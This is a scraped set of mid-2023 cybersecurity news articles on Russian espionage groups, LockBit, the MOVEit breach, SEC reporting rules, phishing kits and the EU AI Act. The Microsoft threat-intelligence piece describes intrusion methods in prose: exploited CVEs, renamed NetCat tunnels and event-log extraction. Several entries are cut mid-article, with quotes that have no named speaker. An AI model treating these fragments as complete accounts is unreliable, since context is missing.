      "text": "  A Russian hacking group that has been targeting Ukraine for almost a decade has mounted “multiple” cyberattacks against the country’s security services, military and government agencies in recent months in a slow-burn espionage campaign.“In some cases, the Russian group succeeded in staging long-running intrusions, lasting for as long as three months,” the Symantec research claims. “The attackers repeatedly attempted to access and steal sensitive information such as reports about the deaths of Ukrainian service members, reports from enemy engagements and air strikes, arsenal inventory reports, training reports, and more.”Symantec said the most recent attacks began in February and March, with Gamaredon maintaining access to some victim devices through May. They targeted machines that “contained what appeared from file names to be sensitive military information.” “There were indications in some organizations that the attackers were on the machines of the organizations’ human resources departments, indicating that information about individuals working at the various organizations was a priority for the attackers, among other things,” Symantec stated.However, Gamaredon is no latecomer; the group has been laser-focused on Ukraine since at least 2014. While they have consistently relied on mainstays like social engineering and spearphishing to gain initial access to victims, they’ve managed to stay relevant over the years by constantly switching up their hacking tools and infrastructure.The group has also been spotted using a new Powershell script to infect devices with custom malware — called Pterodo. Pterodo copies itself on victim machines and takes on provocative filenames like “porn_video.rtf.lnk” or “do_not_delete.rtf.lnk” to lure curious users into opening them. Then it executes a script to download additional malware payloads and copies itself to any connected USB drives. Symantec believes these drives may be for follow on operations to reach air-gapped machines and systems.Symantec’s research aligns with other sources who have tracked a broader shift in Russian cyberspace operations in Ukraine away from short-term smash-and-burn tactics and towards longer plays for espionage and intelligence gathering.“Public and destructive cyber attacks are hardly detected anymore. Instead, they engage in collecting confidential data and conducting reconnaissance. They are attempting to establish a presence in critical infrastructure systems and defense forces,” he said on Twitter June 13.Demediuk also expressed his “opinion” that the change was related to a broader shift by Russian hacking groups towards operations targeting the U.S. 2024 elections, though he offered no evidence for his speculation.Derek is a senior editor and reporter at SC Media, where he has spent the past three years providing award-winning coverage of cybersecurity news across the public and private sectors.

Infostealers were mentioned the most on dark web communities, however, ahead of ransomware and other attack methods.Interestingly, Kaspersky researchers wrote that there is “a direct correlation between the number of mentions of malware families on the dark and deep web and various events related to cybercrime, such as resonant cyberattacks.” “As we can see in the graph above, the termination of group operations, arrests of members, and deletion of posts on hidden forums about the spread of ransomware fail to stop cybercriminal activity completely,” researchers wrote. “A new group replaces the one that has ceased to operate, and it often welcomes members of the defunct one.”Cybercriminals subscribe for ransomware-as-a-service (RaaS) for free, paying a cut of the ransom proceeds after a successful attack. According to Kaspersky, payment is determined by a percentage of the ransom paid by the victim, typically in the 10% to 40% range. Infostealer services are offered through a paid subscription model, with prices between $100 and $300 a month for software designed to steal data such as credentials, passwords, banking accounts, browser history, crypto wallets data, and more.Stephen Weigand is managing editor and production manager for SC Media.

The SEC\n is delaying the finalization of new incident reporting regulations for publicly traded companies until October 2023. (Photo by Spencer Platt/Getty Images)The Securities and Exchange Commission (SEC) this week pushed back its timeline for finalizing new regulations that would require public companies to notify the agency within four days of a cybersecurity breach. A representative from Rapid7 declined further comment when reached by SC Media, stating that a public affairs official was not available today.Nasdaq said in its public comments that the four-business-day timeframe may interfere with a public company’s primary obligation to remediate a cybersecurity intrusion. They also stated that four days was not enough time to understand the nature and scope of a cybersecurity breach as well as its potential impact. Many other comments included in the Atlantic Council report echo these worries.“The costs associated with the incident response programs and more robust notification regime serve an important forcing function for entities that might otherwise not adequately invest in safeguards on the front end,” wrote EPIC. “And those incentives, in conjunction with aggressive SEC enforcement of the safeguards rule itself and routine independent audits carried out under the proposed rules in the Cybersecurity Audit NPRM, are necessary to raise data security standards across the industry.”In its recommendations to the SEC, the Atlantic Council concurred with Rapid7 that a 30-day notification period would give companies enough time to respond in most situations following a breach. They also said the SEC should let companies delay a notification when reporting would have a negative effect on national security, as certified by the U.S. Attorney General or CISA. The SEC has actually asked commenters to weigh in on the national security issue.News of the final rule delay was first reported June 14 by Inside Cybersecurity.October 4, 2023The new PCI DSS standard puts more focus on application security, with more tools, testing and documentation required of developers.The SEC alleges SolarWinds and CISO Tim Brown defrauded investors by not disclosing security risks ahead of the 2020 Orion Sunburst attacks.On-Demand EventOn-Demand EventOn-Demand Event   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

The SQL injection vulnerability, which has since been patched by Progress Software, could lead to escalation of privileges. Additional, though less severe, vulnerabilities were discovered during an investigation of zero-day, which led to a second patch.In a statement, a Department of Energy spokesperson confirmed two DOE entities were compromised in the attack.“The U.S. Department of Energy (DOE) takes cybersecurity and the responsibility to protect its data very seriously. Upon learning that records from two DOE entities were compromised in the global cyberattack on the file-sharing software MOVEit Transfer, DOE took immediate steps to prevent further exposure to the vulnerability and notified the Cybersecurity and Infrastructure Security Agency (CISA),\" the spokesperson said. \"The department has notified Congress and is working with law enforcement, CISA, and the affected entities to investigate the incident and mitigate impacts from the breach.”News of the breach will almost certainly lead to scrutiny on Capitol Hill.Reps. Mark Green, R, Tenn., chair of the House Homeland Security Committee and Andrew Garbarino, R-N.Y., chair of the cybersecurity subcommittee, said they had been in contact with CISA as it triages and provides incident response services to different agencies.“We are pleased with the timeliness of CISA’s response to yet another significant cyber incident impacting a wide range of potential victims who use this popular software. The committee will continue to stay in close communication with CISA as we work to gather more information, including who is responsible and the full extent of the data impacted,\" Green and Garbarino said in a joint statement sent to SC Media. \"This incident is another reminder of the importance of CISA’s commitment to its cybersecurity mission and the need to be appropriately equipped to carry out that mission.”Eric Swalwell, of California, the ranking Democrat on the same subcommittee, said he has spoken with Easterly, who said that early reports indicate no systems or devices were encrypted.“I am closely monitoring the cyber exploit of MOVEit, a file transfer program that is utilized by private companies and the federal government. I spoke this afternoon with CISA Director Jen Easterly who told me that exposures of federal networks and data appear to be minimal and do not pose a systemic or national security risk,\" Swalwell said. \"Additionally, none of the attacks thus far are reported to be encryption-based, meaning networks and servers can still maintain full functionality without first having to pay a ransom.\"Senior editor and reporter Derek B.

      "text": "  The Department of Justice announced that it has arrested Russian national Ruslan Magomedovich Astamirov, claiming he is a part of the LockBit ransomware gang.Astamirov reportedly used numerous email accounts and other infrastructure to launch attacks, including one from a Russian email provider, two more from a New Zealand cloud services account and another from an unnamed overseas account. Some were used to upload exfiltrated victim data.FBI officials subpoenaed records from Meta, Amazon and Microsoft that tied ownership of the accounts to Astamirov. They also used cookie data to link the accounts and Astamirov together. Those emails were traced to ransomware attacks against businesses based in West Palm Beach, Florida, Virginia, Tokyo, Japan, and Virginia. The complaint does not identify the compromised companies. For at least one of those attacks, 80% of a $700,000 ransom payment sent by the victim was sent to a Bitcoin address owned by Astamirov just hours later.Federal agents caught up with Astamirov in Arizona and questioned him on May 13. According to the complaint, he voluntarily consented to being interviewed, and denied any knowledge of one of the connected email addresses, but FBI officials seized his iPhone, iPad, MacBook Pro and a USB drive that same day.Astamirov reportedly recanted on his prior claim under further questioning, and acknowledged that the seized devices contained evidence he had access to those accounts, something forensic analysis later confirmed. He also admitted that \"he himself acquired, used, and sold stolen access credentials for various online services\" according to sworn testimony from FBI Special Agent Kenneth Manning.Astamirov is being charged with two counts of conspiracy to commit fraud and wire fraud related to a computer. If convicted, he faces up to 20 years in prison for the first charge and 5 years for the second, as well as a maximum fine of $250,000.“This LockBit-related arrest, the second in six months, underscores the Justice Department’s unwavering commitment to hold ransomware actors accountable,” said Deputy Attorney General Lisa O. Monaco in a statement. “In securing the arrest of a second Russian national affiliated with the LockBit ransomware, the Department has once again demonstrated the long arm of the law.

      "title": "Cadet Blizzard emerges as a novel and distinct Russian threat actor | Microsoft Security Blog",
      "text": " As Russia’s invasion of Ukraine continues into its second year and Microsoft continues to collaborate with global partners in response, the exposure of destructive cyber capabilities and information operations provide greater clarity into the tools and techniques used by Russian state-sponsored threat actors. Throughout the conflict, Russian threat actors have deployed a variety of destructive capabilities with varying levels of sophistication and impact, which showcase how malicious actors rapidly implement novel techniques during a hybrid war, along with the practical limitations of executing destructive campaigns when significant operational errors are made and the security community rallies around defense. These insights help security researchers continuously refine detection and mitigation capabilities to defend against such attacks as they evolve in a wartime environment.\n\t\t\tBLIZZARD\t\tMicrosoft has tracked Cadet Blizzard since the deployment of WhisperGate in January 2022. We assess that they have been operational in some capacity since at least 2020 and continue to perform network operations through the present. Operationally consistent with the remit and assessed objectives of GRU-led operations throughout Russia’s invasion of Ukraine, Cadet Blizzard has engaged in focused destructive attacks, espionage, and information operations in regionally significant areas. Cadet Blizzard’s operations, though comparatively less prolific in both scale and scope to more established threat actors such as Seashell Blizzard, are structured to deliver impact and frequently run the risk of hampering continuity of network operations and exposing sensitive information through targeted hack-and-leak operations. Primary targeted sectors include government organizations and information technology providers in Ukraine, although organizations in Europe and Latin America have also been targeted.Cadet Blizzard compromises and maintains a foothold on affected networks for months, often exfiltrating data prior to disruptive actions. Microsoft observed Cadet Blizzard’s activity peak between January and June 2022, followed by an extended period of reduced activity. The group re-emerged in January 2023 with increased operations against multiple entities in Ukraine and in Europe, including another round of website defacements and a new “Free Civilian” Telegram channel affiliated with the hack-and-leak front under the same name that first emerged in January 2022, around the same time as the initial defacements. Cadet Blizzard actors are active seven days of the week and have conducted their operations during their primary European targets’ off-business hours. Microsoft assesses that NATO member states involved in providing military aid to Ukraine are at greater risk.Cadet Blizzard seeks to conduct disruption, destruction, and information collection, using whatever means are available and sometimes acting in a haphazard fashion. While the group carries high risk due to their destructive activity, they appear to operate with a lower degree of operational security than that of longstanding and advanced Russian groups such as Seashell Blizzard and Forest Blizzard.  Additionally, as is the case with other Russian state-sponsored threat groups, Microsoft assesses that at least one Russian private sector organization has materially supported Cadet Blizzard by providing operational support including during the WhisperGate destructive attack.Cadet Blizzard’s operations are global in scope but consistently affect regional hotspots in Ukraine, Europe, Central Asia, and, periodically, Latin America. Cadet Blizzard likely prioritizes target networks based on requirements consistent with Russian military or intelligence objectives such as geolocation or perceived impact. Cadet Blizzard, consistent with a Russian military-associated threat actor, continues to mainly target Ukraine, although the relative scope of impact of Cadet Blizzard’s destructive activity is minimal compared to the multiple waves of destructive attacks that we attribute to Seashell Blizzard. In January 2022, Cadet Blizzard launched destructive attacks in Ukraine in the following industry verticals:Cadet Blizzard has repeatedly targeted information technology providers and software developers that provide services to government organizations using a supply chain “compromise one, compromise many” technique. The group’s January 2022 compromise of government entities in Ukraine probably were at least in part due to access and information gained during a breach of an information technology provider that often worked with these organizations.Prior to the war in Ukraine, Cadet Blizzard performed historical compromises of several Eastern European entities as well, primarily affecting the government and technology sectors as early as April 2021. As the war continues, Cadet Blizzard activity poses an increasing risk to the broader European community, specifically any successful attacks against governments and IT service providers, which may give the actor both tactical and strategic-level insight into Western operations and policy surrounding the conflict. Gaining heightened levels of access into these targeted sectors may also enable Cadet Blizzard to carry out retaliatory demonstrations in opposition to the West’s support for Ukraine.Cadet Blizzard is a conventional network operator and commonly utilizes living-off-the-land techniques after gaining initial access to move laterally through the network, collect credentials and other information, and deploy defense evasion techniques and persistence mechanisms. Unlike other Russian-affiliated groups that historically prefer to remain undetected to perform espionage, the result of at least some notable Cadet Blizzard operations are extremely disruptive and are almost certainly intended to be public signals to their targets to achieve the larger objective of destruction, disruption, and possibly, intimidation.Initial accessCadet Blizzard predominantly achieves initial access through exploitation of web servers commonly found on network perimeters and DMZs. Cadet Blizzard is also known for exploiting Confluence servers through the CVE-2021-26084 vulnerability, Exchange servers through multiple vulnerabilities including CVE-2022-41040 and ProxyShell, and likely commodity vulnerabilities in various open-source platforms such as content management systems.PersistencePrivilege escalation and credential harvestingCadet Blizzard has leveraged a variety of living-off-the-land techniques to conduct privilege escalation and harvesting of credentials.Command execution and C2Cadet Blizzard periodically uses generic socket-based tunneling utilities to facilitate command and control (C2) to actor-controlled infrastructure. Payloads such as NetCat and Go Simple Tunnel (GOST) are commonly renamed to blend into the operating system but are used to shovel interactive command prompts over established sockets. Frequently, remote command execution may be facilitated through remotely scheduled tasks. The group has also sparingly utilized Meterpreter.Operational securityCadet Blizzard utilizes anonymization services IVPN, SurfShark, and Tor as their anonymization layer during select operations.Anti-forensicsCadet Blizzard has been observed leveraging the Win32_NTEventlogFile commandlet in PowerShell to extract both system and security event logs to an operational directory. The activities are anticipated to be consistent with anti-forensics activities.Impact assessmentCadet Blizzard typically collects information en-masse from targeted servers. If mail servers are affected, Cadet Blizzard typically attempts to collect mail, placing incident response communications at risk. Credential material (such as SSH keys) are also a common target to provide methods for re-entry if a full remediation does not occur. As was the case with the WhisperGate operation in January 2022, Cadet Blizzard is known to deploy destructive malware to select target environments to delete data and render systems inoperable.Also in January of 2022, Microsoft identified that data exfiltrated by Cadet Blizzard in compromises of various Ukrainian organizations was leaked on a Tor .onion site under the name “Free Civilian.” The organizations from which data was leaked strongly correlated to multiple Cadet Blizzard compromises earlier in 2022, leading Microsoft to assess that this forum is almost certainly linked to Cadet Blizzard. In February 2023, a new Telegram channel was established under the same “Free Civilian” moniker, suggesting that Cadet Blizzard intends to continue conducting information operations in the second year of the war. However, the public channel only has 1.3K followers with posts getting at most a dozen reactions as of the time of publication, signifying low user interaction. A private channel assumed to be operated by the same group appears to have shared data with 748 of those subscribers.Cadet Blizzard operations do not occur in a silo; there have been substantial technical indicators of intersection with other malicious cyber activity that may have a broader scope or a nexus outside of Russia. They have at times utilized services associated with these ecosystems such as Storm-0587, discussed below, as well as having support from at least one private sector enabler organization within Russia. Though there have been various forms of intersections in threat activity, when these groups have been observed operating independently, the tactics, techniques, procedures (TTPs) and capabilities have often been distinct—therefore making it operationally valuable to distinguish these activity groups.Storm-0587Activities linked to Cadet Blizzard indicate that they are comprehensive in their approach and have demonstrated an ability to hold networks at risk of continued compromise for an extended period of time. A comprehensive approach to incident response may be required in order to fully remediate from Cadet Blizzard operations. Organizations can bolster security of information assets and expedite incident response by focusing on areas of risk based on actor tradecraft enumerated within this report. Use the included indicators of compromise to investigate environments and assess for potential intrusion.To uncover malicious hands-on-keyboard activities in environments, identify any unusual or unexpected commands or tools launched on systems as well as the presence of any unusual directories or files that could be used for staging or storing malicious tools.

      "title": "CISA: LockBit behind 1 in 6 U.S. gov’t ransomware attacks in 2022",
      "text": " About one in every six ransomware attacks targeting U.S. government offices in 2022 can be traced back to a single group: LockBit.Cybersecurity agencies around the world said Wednesday that the LockBit gang, which has links to Russia, is one of the biggest cybersecurity threats that governments and other organizations face.The agencies said LockBit has claimed responsibility for at least 1,653 ransomware attacks, based on victims posted to its leak site.The gang has brought in about $91 million in ransoms from U.S. victims since its first reported attack in the country in January 2020.Each country provided its own statistics illustrating LockBit’s unparalleled attack frequency, with Australia noting that in the last year the gang made up 18% of total reported ransomware incidents. In Canada and New Zealand, meanwhile, LockBit was responsible for just over 1 in every 5 attacks last year.France said 11% of the attacks it has seen since 2020 involved LockBit but noted that in a portion of the cases it was not able to confirm nor deny the breach of victim networks, basing it solely on the gang’s leak site posting.In the U.S., the group accounted for 16% of attacks on public entities, which include municipal and county governments, public higher education and K-12 schools, as well as on emergency services like law enforcement agencies.“Ransomware is one of the most severe cyber threats for government, businesses and society,” said Gerhard Schabhueser, acting president for Germany’s Federal Office for Information Security (BSI).“Amongst those actors guided by financial motivations, the Ransomware-as-a-Service LockBit is currently the most menacing in Germany as well as globally. We reiterate our call to all organizations to take appropriate action and increase their resilience.”The advisory lays out several tactics and vulnerabilities typically exploited by the group during attacks and notes that part of the gang’s success is in its use of affiliates, which find diverse ways to breach organizations.According to the agencies, the group allows affiliates to receive ransom payments and then send the developers their cut, a practice that “stands in stark contrast to other RaaS groups who pay themselves first and then disburse the affiliates’ cut.”LockBit has participated in several publicity-generating stunts like paying people to get tattoos of their insignia and running bug bounty programs for their ransomware.The group has also created a simplified interface that allows less technically-skilled hackers to simply “point-and-click” during attacks. LockBit has evolved significantly over time, releasing 2.0 and 3.0 versions since 2021.LockBit 3.0 — known as LockBit Black — incorporates tooling from BlackMatter and Alphv ransomware strains while the LockBit Green strain released in January 2023 incorporates source code from the now-defunct Conti ransomware.According to the agencies, the introduction of LockBit 2.0 in mid-2021 had an “immediate impact on the cybercriminal market” as it coincided with the demise of multiple RaaS operations, like DarkSide and Avaddon.“LockBit competed with other RaaS operations, like Hive RaaS, to fill the gap in the cybercriminal market leading to an influx of LockBit affiliates,” they said.Several affiliates have also used more popular vulnerabilities like Log4j during attacks. The advisory includes a list of about 30 tools used by the hackers and more information on the gang’s modus operandi.“LockBit is one of the most prolific and disruptive ransomware variants, having been used by cybercriminals against multiple sectors and organizations worldwide, including in Australia,” said Abigail Bradshaw, head of the Australian Cyber Security Centre. “With ransomware variants constantly evolving, this advice can help organizations strengthen and defend their networks.”Several cybersecurity experts said LockBit has stood out from its competitors in recent years by constantly improving its model.Sean McNee, vice president of research and data at cybersecurity firm DomainTools, said the group has professionalized its business model and now actively advertises on online forums to beef up its affiliate network.Others noted that the group’s ability to dumb down the ransomware attack process was LockBit’s most worrying development. The gang has “lowered the barrier for entry significantly, said Dror Liwer, co-founder of the AI-based cybersecurity company Coro.“Now that the barrier of entry has been lowered, and the attack cost has been commoditized, the ROI of attacks against mid-market and small organizations has improved greatly, leading attackers to target these much more vulnerable organizations, who do not have the same security stack or teams protecting them as the Fortune 500 do,” Liwer said.Tom Kellermann, a former Obama administration cybersecurity official, added that LockBit has been able to help Russia offset some Western economic sanctions through its increased number of ransomware attacks, affiliating itself “with cybercrime cartels that enjoy a pax mafiosa with the Russian government.”Jonathan Greig is a Breaking News Reporter at Recorded Future News.

      "text": " UK / EMEA News Reporter, Infosecurity MagazineOff-the-shelf toolkits have helped to democratize phishing to the cybercrime masses for several years, but specialized tools dedicated to MFA bypass are a relatively new sight, Proofpoint said in its latest report, The Human Factor 2023.Proofpoint highlighted three popular toolkits – EvilProxy, Evilginx2 and NakedPages – as being particularly prolific in 2022.EvilProxy is an advanced phishing-as-a-service platform, while Evilginx2 is a red team tool enabling reverse proxy attacks against MFA. NakedPages is an off-the-shelf phishing kit that also uses reverse proxy techniques.Also on the rise are telephone-oriented attack delivery (TOAD) threats, which peaked at over 13 million per month in 2022, according to the report.This novel threat typically begins with a phishing message – such as a fake invoice – which encourages the recipient to call a telephone helpline. Doing so will put them in direct contact not with a legitimate call center, but one run by a fraud gang.Once on the phone, the victim may be tricked into installing malware or granting the call center operative access to their machine.Proofpoint highlighted BazaCall as a particularly prolific early exponent of the TOAD threat, using lures like fake movie streaming sites and unannounced Justin Bieber tours to reel in victims. The group would typically try to trick the victim over the phone into downloading the now-defunct BazaLoader malware.Proofpoint claimed that the sheer number of TOAD threats, detected in their millions on a monthly basis, indicate their adoption by a larger number of less sophisticated groups.Elsewhere, Proofpoint detected a twelvefold increase in “conversational” scams including romance fraud, fake job ads and pig butchering crypto fraud – making it the fastest growing threat in the mobile space."

      "text": " UK / EMEA News Reporter, Infosecurity MagazineThe policing organization sounded the warning in its EU Terrorism Situation and Trend (TE-SAT) Report 2023 published today.“Emerging online mediums, such as the metaverse, might be utilized for the dissemination of propaganda, recruitment and the coordination of terrorist and violent extremist activities,” it noted.“A similar development might be observed with open source decentralized platforms, as these are becoming more popular among terrorists and violent extremists.”While the metaverse threat is still on the horizon given its early stage of development, decentralized P2P apps used for propaganda are already causing law enforcers problems as they are harder to moderate and investigate, Europol argued.The online environment lowers the bar for entering the world of terrorism and extremism, broadens the range of people that can become exposed to radicalization and increases the unpredictability of terrorism and extremism, the report added.Europol also pointed to the potential use of deepfakes, augmented reality and conversational AI to enhance the efficiency of terrorist propaganda. Both these technologies and IoT tools can also be deployed in “more practical tasks such as the remote operation of vehicles and weapons used in attacks or setting up virtual training camps,” it said.While these emerging technologies are very much on the radar, current tools already being exploited by terrorist and extremist groups are end-to-end encrypted (E2EE) messaging platforms and gaming-adjacent platforms for recruitment purposes and propaganda dissemination.Both Islamic terror groups like IS and right-wing extremists exploit the latter – creating groups on gaming comms apps and “extremist utopias within popular video games” in order to appeal to younger recruits.There were 28 completed, failed or foiled attacks recorded in the EU last year, during which four people lost their lives."

      "text": " Editor, Infosecurity MagazineAhead of Infosecurity Europe, (ISC)² and the Chartered Institute of Information Security (CIISec) have released a new guide to inclusive language in cybersecurity.The guide outlines the importance of inclusive terminology and language to fostering a more inclusive cyber profession and offers an alternative vocabulary guide and general language guidance for cybersecurity professionals.The current cyber workforce gap stands at 3.4 million, and the global cybersecurity workforce still needs to increase by 65% to effectively defend organizations’ critical assets. Organizations understand that they need to rethink how they hire and that closing the workforce gap means addressing the lack of diversity and inclusion in the industry.“To attract as many people as possible to the cybersecurity industry, we need to ensure that the barriers to entry are tackled,” said Dwan Jones, Director of Diversity, Equity and Inclusion at (ISC)².“This means fostering more inclusive environments and changing the negative perceptions of cyber which allows for more individuals from diverse backgrounds to see themselves in the cyber profession. Inclusive language alone will not solve all of these problems, but it can help change the work culture and avoid alienating those we need to fill the workforce gap,” Jones added. Amanda Finch, CEO at CIISec said, “The challenge lies in identifying, hiring and correctly supporting skilled employees from any and every background. If the industry doesn’t act then others will and we’ll see that talent either go elsewhere or lie completely undiscovered.”She highlighted a “worst-case scenario” which could see people with fantastic potential end up working for the bad guys, who recognize and support their different needs.“The industry must ensure this isn’t the case by doing more to attract these prospective cybersecurity stars of the future. A big part of this will come down to the language that we use, and ensuring we foster a more inclusive culture that the industry needs,” Finch added.Leading members of the cybersecurity industry were involved in the creation of the document that gives and general language guidance for cybersecurity professionals, offering key tips to keep in mind when writing code and documentation.“Language can be the thing that breaks or binds us, which is why we can use it to break down barriers,” said Sarah Armstrong-Smith, Chief Security Advisor at Microsoft.Nicola Whiting MBE, Co-owner of Titania Group, noted that while language does not define us it does shape us, and also affects how others perceive us. “Showing you care about peoples worth, by actively choosing empowering language (demonstrating you value and respect others) isn't only good business, it's good humanity,\" she said.Finally, Nurul Gee Zulkifli Lead, Business Efficiency & Employee Engagement at Standard Chartered, added: “There is power in words, and you can make a difference with them. Choose inclusive words that acknowledge and enable others to be seen, heard and valued.”The Alternative Vocabulary Guide is organized into categories around race and ethnicity, gender and orientation, accessibility, military and criminal justice, and age. The general language guidance offers key tips to keep in mind when writing code and documentation, including:●            Avoiding using terms that have a social history●            Avoiding acronyms, idioms, and jargon●            Being mindful of perpetuating stereotypes or biases●            Using automated accessibility checks and authoring tools"

      "title": "\r\n\tEU Passes Landmark Artificial Intelligence Act - Infosecurity Magazine\r\n",
      "text": " Reporter, Infosecurity MagazineIntroduced in April 2021, the AI Act aims to strictly regulate AI services and mitigate the risk it poses. The first draft, which included measures such as adding safeguards to biometric data exploitation, mass surveillance systems and policing algorithms, pre-empted the surge in generative AI tool adoption that started in late 2022.Its latest draft, introduced in May 2023, introduced new measures to control “foundational models.”These include a tiered approach for AI models, from ‘low and minimal risk’ through ‘limited risk,’ ‘high risk’ and ‘unacceptable risk’ AI practices.The ‘low and minimal risk’ AI tools will not be regulated, while the ‘limited risk’ ones will need to be transparent. The ‘high-risk’ AI practices, however, will be strictly regulated. The EU will require a database of general-purpose and high-risk AI systems to explain where, when and how they’re being deployed in the EU.“This database should be freely and publicly accessible, easily understandable, and machine-readable. It should also be user-friendly and easily navigable, with search functionalities at minimum allowing the general public to search the database for specific high-risk systems, locations, categories of risk [and] keywords,” the legislation says.AI models involving ‘unacceptable risk’ will be banned altogether.Edward Machin, a senior lawyer in the data, privacy & cybersecurity team at the law firm Ropes & Gray, welcomed the legislation: \"Despite the significant hype around generative AI, the legislation has always been intended to focus on a broad range of high-risk uses beyond chatbots, such as facial recognition technologies and profiling systems. The AI Act is shaping up to be the world’s strictest law on artificial intelligence and will be the benchmark against which other legislation is judged.”Kevin Bocek, VP for ecosystem and community at Venafi, also praised the layered approach taken by the EU: \"The great thing about the EU’s AI Act is that it proposes assigning AI models identities, akin to human passports, subjecting them to a conformity assessment for registration on the EU’s database. This progressive approach will enhance AI governance, safeguarding individuals and help to maintain control. For businesses using and innovating with AI, they’ll need to start evaluating if their AI falls under the categories of risk proposed in the AI Act and comply with assessments and registration to uphold safety and public trust.”Just like with the General Data Protection Regulation (GDPR) for the protection of personal data, the AI Act will also be the first AI legislation in the world to impose heavy fines for non-compliance, with up to €30m ($32m) or 6% of global profits.With this pioneering regulation, EU lawmakers hope other countries will follow suit. In April, 12 EU lawmakers working on AI legislation called for a global summit to find ways to control the development of advanced AI systems.Later, on June 12, Sunak announced at the London Tech Week that Google DeepMind, OpenAI and Anthropic have agreed to open up their AI models to the UK government for research and safety purposes.Machin commented: “It remains to be seen whether the UK will have second thoughts about its light-touch approach to regulation in the face of growing public concern around AI, but in any event the AI Act will continue to influence lawmakers in Europe and beyond for the foreseeable future.” She said that “as a global leader in AI – ranking third behind the US and China – […] the UK is well placed to safely take advantage of the developments in artificial intelligence. That’s why the Prime Minister’s AI Summit comes at a perfect time to bring together global experts to share their ideas.”While she outlined the three goals of the NCSC in addressing the cyber threats posed by generative AI – help organizations understand the risk, maximize the benefits of AI to the cyber defense community and understand how our adversaries […] are using AI and how we can disrupt them – she did not mention AI regulation."

By leveraging this flaw, attackers can extract PII data by bypassing authentication controls.The plugin vendor then released a patch to address the vulnerability on May 30. WooCommerce Stripe Gateway version 7.4.1 or subsequent versions should be installed immediately to mitigate the risk.“If you’re a WooCommerce Stripe Gateway user, please update the plugin to at least version 7.4.1,” Muhammad said.Despite the patches, the security researcher warned website owners and developers using the WooCommerce Stripe Gateway plugin to stay vigilant and always ascertain access control around order objects by checking the order key and ownership."

      "text": "  Microsoft has addressed six critical vulnerabilities in this month’s Patch Tuesday which, for the first time since March 2022, did not feature any new zero-day bug fixes.The critical vulnerabilities addressed in this month include four remote code execution bugs: three in Windows Pragmatic General Multicast and one in .NET/Visual Studio.The other two critical vulnerabilities were a SharePoint elevation of privilege bug and a denial-of-service bug in Microsoft’s Hyper-V server (CVSSv3 score of 6.5). Adam Barnett, lead software engineer at security vendor Rapid7, said June was the third month in a row to include at least one critical RCE bug in Windows PGM.“Microsoft hasn’t detected exploitation or disclosure for any of these, and considers exploitation less likely [than the SharePoint vulnerability], but a trio of critical RCEs with a base [severity] score of 9.8 will deservedly attract a degree of attention,” he said.“As with previous similar vulnerabilities, only systems where Windows Message Queueing Service (MSMQ) is enabled are exploitable, and it isn’t enabled by default. As Rapid7 has noted previously, however, a number of applications – including Microsoft Exchange – quietly introduce MSMQ as part of their own installation routine.”“Although Microsoft has no knowledge of public disclosure or exploitation in the wild, and considers exploitation less likely, the long list of patches – going back as far as .NET Framework 3.5 on Windows 10 1607 – means that this vulnerability has been present for years.”“It’s an open-and-own sort of exploit, but guessing by the Critical rating, it appears there are no warning dialogs when opening the dodgy file,” he said.The other 61 non-critical vulnerabilities covered by Microsoft this month spanned a range of environments and solutions including Windows, Office, Exchange Server, Visual Studio, Teams, Azure DevOps, Dynamics and Remote Desktop Client.As with the critical vulnerabilities, RCE bugs featured prominently, accounting for 22 – or more than a third – of the CVEs rated “important.”“This volume of fixes is slightly larger than the typical number of fixes for June, but not extraordinarily so,” Childs said.Simon Hendery is a freelance IT consultant specializing in security, compliance, and enterprise workflows.

      "text": "  Microsoft announced Wednesday that a state-sponsored threat group it has been tracking since January 2022 is a new advanced persistent threat (APT) group linked with Russia’s military intelligence agency, the GRU. Microsoft Threat Intelligence described WhisperGate as having “a destructive capability that wipes Master Boot Records (MBRs)” and is intended to delete data and make systems inoperable. Cadet Blizzard is structured to expose sensitive information through targeted hack-and-leak operations, but is not considered to be as prolific in scale and scope as its more established Russian brethren, the blog noted.A Microsoft Threat Intelligence employee who goes by the name “Justin” on Twitter (@sixdub), said: “The group has been tasked with high profile destructive attacks and information ops. We were surprised to see a novel group w/ this remit.” Justin went on to say other Russian groups shouldn’t be jealous of Cadet Blizzard as it has had limited success and its overall novelty and immaturity shows in their intrusions.Cadet Blizzard has primarily targeted Ukrainian government organizations and information technology providers, but Microsoft said organizations in Europe and Latin America have also fallen victim to the group. Microsoft Threat Intelligence assessed tha member states in the NATO alliance involved in providing military aid to Ukraine are at greater risk.Its activity peaked between January and June 2022, and increased operations again in January 2023 against Ukraine and Europe with website defacements and a “Free Civilian” Telegram channel after a period of reduced activity. The group consistently targets information tech providers and software developers providing services to government organizations using supply chain “compromise one, compromise many” techniques, according to Microsoft. It commonly uses living-off-the-land techniques after gaining initial access to move laterally through networks, collect credentials and other information, and deploys evasion techniques.“Unlike other Russian-affiliated groups that historically prefer to remain undetected to perform espionage, the result of at least some notable Cadet Blizzard operations are extremely disruptive and are almost certainly intended to be public signals to their targets to achieve the larger objective of destruction, disruption, and possibly, intimidation,” the theat intel team wrote.Stephen Weigand is managing editor and production manager for SC Media.

It has an annual net income of about $122 million and more than 600 employees.“Upon becoming aware of the Incident, the DBSA immediately conducted an investigation and determined that” information including business names, the names of directors and shareholders, addresses, identification documents, and contact information including phone numbers and email addresses “may have been unlawfully accessed or acquired by the threat actor,” the bank said.Many of the documents also had details of commercial or employment relationships with DBSA and financial information of stakeholders.The bank’s investigation into the incident is ongoing but it warned that hackers may “attempt to impersonate stakeholders using the compromised Personal Information.”“As a result, DBSA encourages stakeholders to remain vigilant and alert to any evidence that their Personal Information is being used incorrectly, and take care to identify any unauthorized actions as they relate to your Personal Information,” the bank explained.Several South African law enforcement agencies and regulators are involved in the investigation and the bank has hired a forensic investigator to monitor for leaked information appearing on the dark web.Since the attack occurred, the company has been able to restore its IT environment and remove the ransomware group from its systems, it said.Jonathan Greig is a Breaking News Reporter at Recorded Future News.

